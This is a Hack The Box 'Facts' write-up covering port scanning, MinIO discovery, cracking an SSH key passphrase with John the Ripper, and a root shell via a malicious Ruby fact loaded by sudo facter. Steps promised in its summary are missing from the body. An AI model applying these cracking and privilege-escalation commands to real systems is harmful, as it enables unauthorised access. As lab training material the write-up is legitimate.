> A complete Hack The Box Facts walkthrough covering Chameleon CMS v2.9.0 privilege escalation, MinIO S3 credential extraction, SSH private key passphrase cracking with John the Ripper, and root privilege escalation via misconfigured sudo Facter.

## Recon

First thing, I added the target to `/etc/hosts` so I can access it using the domain:

```plaintext
10.129.244.96 facts.htb
```
{: file="/etc/hosts" }

Then I started with a quick scan on the top 1000 ports:

```shell
nmap -sS -T4 --top-ports 1000 -oN initial_scan_result.txt facts.htb
```
{: .nolineno }

- `-sS` → SYN scan (fast and stealthy)
    
- `-T4` → speeds things up
    
- `--top-ports 1000` → most common ports
    
- `-oN` → save output
    

### Result

```
22/tcp open  ssh
80/tcp open  http
```

Nothing unusual so far — just SSH and HTTP.

---

Since this only checks common ports, I went for a full scan to make sure nothing is hidden:

```shell
nmap -p- -Pn --min-rate 1000 -oN full_scan_result.txt facts.htb
```
{: .nolineno }

- `-p-` → scan all ports
    
- `-Pn` → skip host discovery
    
- `--min-rate 1000` → faster scan
    

### Result

```
22/tcp    open  ssh
80/tcp    open  http
54321/tcp open  unknown
```

Now that’s interesting — port **54321** wasn’t in the top 1000.

---

## Checking port 54321

I ran a targeted scan to identify the service:

```shell
nmap -sV -sC -p 54321 -oN targeted_scan.txt facts.htb
```
{: .nolineno }

- `-sV` → service version detection
    
- `-sC` → default scripts
    
- `-p 54321` → only this port
    

### Result

```
54321/tcp open  http    Golang net/http server
Server: MinIO
```

Nice — it’s running **MinIO**.

---

## Quick note on MinIO

MinIO is basically an object storage server (similar to S3).  
Data is stored in **buckets**, and you usually need:

- Access Key
    
- Secret Key
    

So yeah, authentication is required.

## SSH Key Access

After downloading the `.ssh` folder, the idea is simple:

- fix permissions on the private key (SSH won’t accept it otherwise)
    
- use it to authenticate to the machine
    

---

![](facts_9.png){: width="800" height="400" .shadow }

After downloading the `.ssh` directory, I checked the file permissions.

The private key `id_ed25519` already had restricted permissions:

```shell
-rw------- id_ed25519
```
{: .nolineno }

Still, I explicitly set it to `600` just to be safe, since SSH requires strict permissions on private keys.

---

Then I tried to inspect the key using:

```shell
ssh-keygen -y -f id_ed25519
```
{: .nolineno }

This command extracts the **public key** from the private key.

---

## Observation

It prompted for a passphrase:

```text
Enter passphrase for "id_ed25519":
```

This means the private key is **encrypted with a passphrase**.

---

![](facts_10.png){: width="800" height="400" .shadow }

Since the private key was protected with a passphrase, I needed to crack it before using it.

To do that, I used **`ssh2john.py`**, a helper script from John the Ripper, which converts SSH private keys into a hash format that can be cracked.

```shell
~/tools/john/run/ssh2john.py id_ed25519 > key.hash
```
{: .nolineno }

This generated a crackable hash from the private key.

---

Next, I used **John the Ripper** itself to perform the cracking, using the popular `rockyou.txt` wordlist:

```shell
~/tools/john/run/john key.hash --wordlist=rockyou.txt
```
{: .nolineno }

After a few minutes, the passphrase was successfully recovered:

```text
dragonballz (id_ed25519)
```

---

With the passphrase in hand, I validated the private key using **`ssh-keygen`** (a standard SSH utility used for key management):

```shell
ssh-keygen -y -f id_ed25519
```
{: .nolineno }

After entering the passphrase, it returned the corresponding public key:

```text
ssh-ed25519 ... trivia@facts.htb
```

This confirmed that the key is valid and belongs to the user `trivia`.

---

## Why this is interesting

Facter supports loading **custom facts**, including:

- external scripts
    
- custom directories
    
- Ruby-based extensions
    

And since it runs as **root via sudo**, any code executed through it will also run as root.

---

## Exploitation Idea

Facter has an option:

```shell
--external-dir
```
{: .nolineno }

This allows loading custom scripts from a directory.

So the plan is:

1. Create a malicious script
    
2. Tell Facter to load it
    
3. Execute it as root
    

---

![](facts_13.png){: width="800" height="400" .shadow }

## Privilege Escalation

Since **Facter** can be executed as root with `sudo`, and it supports loading custom Ruby facts, I leveraged that to execute arbitrary code as root.

---

First, I created a temporary directory to store the malicious fact:

```shell
mktemp -d
```
{: .nolineno }

Output:

```text
/tmp/tmp.vpOFjwQ7pn
```

---

Then I created a malicious Ruby script inside that directory:

```shell
echo 'exec("/bin/bash")' > /tmp/tmp.vpOFjwQ7pn/pwn.rb
```
{: .nolineno }

This will spawn a root shell when executed.

---

Finally, I executed **Facter** with the custom directory:

```shell
sudo /usr/bin/facter --custom-dir /tmp/tmp.vpOFjwQ7pn/
```
{: .nolineno }

---
